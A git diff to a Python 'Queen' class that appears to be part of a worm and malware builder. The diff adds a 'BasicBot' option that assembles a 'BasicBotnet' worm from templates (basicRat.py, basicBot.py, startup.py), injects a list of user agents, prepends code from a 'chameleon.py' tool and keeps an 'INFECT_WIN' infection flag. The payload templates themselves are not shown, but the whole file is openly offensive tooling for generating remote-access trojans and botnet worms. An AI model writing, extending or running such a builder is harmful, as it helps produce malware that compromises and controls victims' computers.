@@ -18,8 +18,9 @@ class Queen:
         self._temp = {"basic" : self.loadTemp("basicW.py"),
                     "start" : self.loadTemp("startup.py"),
                     "echo" : self.loadTemp("echo.py"),
-                    "basic_rat" : self.loadTemp("basicRat.py")}
-        self._emptyConf = {"MULTIPROCESING_FREEZE" : None, "INFECT_WIN" : True}
+                    "basic_rat" : self.loadTemp("basicRat.py"),
+                    "basic_bot" : self.loadTemp("basicBot.py")}
+        self._emptyConf = {"MULTIPROCESING_FREEZE" : None, "INFECT_WIN" : False}
 
 
     
@@ -28,9 +29,22 @@ class Queen:
         self.tempDir = os.path.join(self.hiveDir, "templates")
         self.chamPath = os.path.join(Path(self.hiveDir).parent, "meine_server", "tools", "chameleon.py")
         self.hiveOutDir = os.path.join(self.baseConf.CONF["MAIN_DIR"], "HIVE")
+        self.libraryDir = os.path.join(self.baseConf.CONF["APP_DIR"], "library")
+        self.ua_file = os.path.join(self.libraryDir, "user_agents.txt")
         if not os.path.exists(self.hiveOutDir):
             os.mkdir(self.hiveOutDir)
-    
+
+
+    def loadData(self, path: str) -> list:
+        data = []
+        with open(path, "r") as f:
+            for line in f.readlines():
+                if line == "" or line == "\n" or line.startswith("#"):
+                    continue
+                data.append(line.rstrip("\n"))
+        return data
+
+
     def loadChamCode(self) -> None:
         with open(self.chamPath, "r") as f:
             self.chamCode = f.read() + "\n\n\n"
@@ -74,6 +88,11 @@ class Queen:
                 conf.update({"WORM_NAME" : "BasicRat"})
                 a = self.renderTemplate("basic", conf)
                 b = self.renderTemplate("basic_rat")
+            case "BasicBot":
+                conf.update({"WORM_NAME" : "BasicBotnet", "MULTIPROCESING_FREEZE" : True})
+                conf["USER_AGENT"] = self.loadData(self.ua_file)
+                a = self.renderTemplate("basic", conf)
+                b = self.renderTemplate("basic_bot", conf)
         startup = self.renderTemplate("start", conf)
         fcode = self.chamCode + a + b + c + d + startup
         worm_name = self.saveWorm(name, types, fcode)
